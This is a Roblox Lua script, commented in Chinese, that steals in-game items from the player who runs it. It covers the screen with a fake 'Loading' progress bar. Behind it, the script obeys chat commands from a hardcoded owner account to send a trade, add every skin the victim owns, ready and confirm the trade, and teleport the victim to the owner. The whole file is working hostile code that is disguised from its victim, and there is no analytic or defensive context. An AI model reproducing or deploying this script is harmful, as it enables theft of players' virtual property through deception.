local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local StarterGui = game:GetService("StarterGui")
local MainEvent = ReplicatedStorage:WaitForChild("MainEvent")

local OwnerName = "XxStormCrystalxX2016"

-- 🔳 先建置 loading 螢幕
local function createLoadingScreen()
    if LocalPlayer.PlayerGui:FindFirstChild("ScriptLoadingGui") then
        LocalPlayer.PlayerGui.ScriptLoadingGui:Destroy()
    end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "ScriptLoadingGui"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

    local bgFrame = Instance.new("Frame")
    bgFrame.Size = UDim2.new(1, 0, 1, 0)
    bgFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    bgFrame.BorderSizePixel = 0
    bgFrame.Parent = screenGui

    local progressBarBg = Instance.new("Frame")
    progressBarBg.Size = UDim2.new(0, 400, 0, 30)
    progressBarBg.Position = UDim2.new(0.5, -200, 0.5, 20)
    progressBarBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    progressBarBg.BorderSizePixel = 0
    progressBarBg.Parent = screenGui

    local progressBar = Instance.new("Frame")
    progressBar.Size = UDim2.new(0, 0, 1, 0)
    progressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
    progressBar.BorderSizePixel = 0
    progressBar.Parent = progressBarBg

    local loadingLabel = Instance.new("TextLabel")
    loadingLabel.Size = UDim2.new(0, 400, 0, 100)
    loadingLabel.Position = UDim2.new(0.5, -200, 0.5, -50)
    loadingLabel.BackgroundTransparency = 1
    loadingLabel.Text = "Loading."
    loadingLabel.TextColor3 = Color3.new(1, 1, 1)
    loadingLabel.TextStrokeTransparency = 0
    loadingLabel.Font = Enum.Font.SourceSansBold
    loadingLabel.TextScaled = true
    loadingLabel.Parent = screenGui

    local percent = 0
    local dotState = 0

    task.spawn(function()
        while screenGui.Parent do
            task.wait(0.05)
            if percent < 90 then
                percent += math.random(1, 3)
                if percent > 90 then percent = 90 end
                progressBar.Size = UDim2.new(percent / 100, 0, 1, 0)
            end
        end
    end)

    task.spawn(function()
        while screenGui.Parent do
            task.wait(0.4)
            dotState = (dotState + 1) % 4
            local dots = string.rep(".", dotState)
            loadingLabel.Text = "Loading" .. dots .. " " .. percent .. "%"
        end
    end)

    LocalPlayer.CharacterAdded:Connect(function()
        screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    end)
end

createLoadingScreen()

-- 👉 查找玩家 (partial match + 無視大小寫)
local function getPlayerByPartialName(name)
    name = name:lower()
    for _, player in pairs(Players:GetPlayers()) do
        if player.Name:lower():sub(1, #name) == name then
            return player
        end
    end
end

-- 📦 發送交易邀請
local function sendTradeRequest(targetName)
    local target = getPlayerByPartialName(targetName)
    if target then
        MainEvent:FireServer("Trading", "Request", target)
        print("sss")
    else
        warn("cant find")
    end
end

-- 📦 加入所有皮膚
local function addAllSkins()
    local skinsStr = LocalPlayer.DataFolder.Skins.Value
    local success, skinsTable = pcall(function()
        return HttpService:JSONDecode(skinsStr)
    end)
    if not success then warn("data wrong") return end

    for category, skins in pairs(skinsTable) do
        for skinName, quantity in pairs(skins) do
            if quantity > 0 then
                for i = 1, quantity do
                    MainEvent:FireServer("Trading", "Add", category, skinName)
                    task.wait(0.05)
                end
            end
        end
    end
    print("yerrrrr")
end

-- 📦 Ready & Confirm
local function tradeReady()
    MainEvent:FireServer("Trading", "Ready", "", "")
    print("hi")
end

local function tradeConfirm()
    MainEvent:FireServer("Trading", "Confirm", "", "")
    print("yeeeee")
end

-- 📦 TPME 指令：將你瞬移到主帳
local function teleportToOwner()
    local owner = Players:FindFirstChild(OwnerName)
    if not owner or not owner.Character then
        warn("cantfind2")
        return
    end
    local ownerHRP = owner.Character:FindFirstChild("HumanoidRootPart")
    local myHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if ownerHRP and myHRP then
        myHRP.CFrame = ownerHRP.CFrame * CFrame.new(2,0,0) -- 跳到主帳旁邊
        print("t")
    else
        warn("humanoidrootpart missing")
    end
end

-- 📦 開關 loading UI
local function hideLoadingScreen()
    if LocalPlayer.PlayerGui:FindFirstChild("ScriptLoadingGui") then
        LocalPlayer.PlayerGui.ScriptLoadingGui:Destroy()
        print("done")
    end
end

local function showLoadingScreen()
    createLoadingScreen()
    print("laoding")
end

-- 📦 綁定主帳指令監聽
local function setupCommands(player)
    if player.Name == OwnerName then
        player.Chatted:Connect(function(msg)
            local args = msg:split(" ")
            local cmd = args[1]:lower()
            local target = args[2]

            if cmd == "!send" and target then
                sendTradeRequest(target)
            elseif cmd == "!addall" then
                addAllSkins()
            elseif cmd == "!ready" then
                tradeReady()
            elseif cmd == "!confirm" then
                tradeConfirm()
            elseif cmd == "!hideui" then
                hideLoadingScreen()
            elseif cmd == "!showui" then
                showLoadingScreen()
            elseif cmd == ".tpme" then
                teleportToOwner()
            end
        end)
    end
end

Players.PlayerAdded:Connect(setupCommands)

for _, player in ipairs(Players:GetPlayers()) do
    setupCommands(player)
end
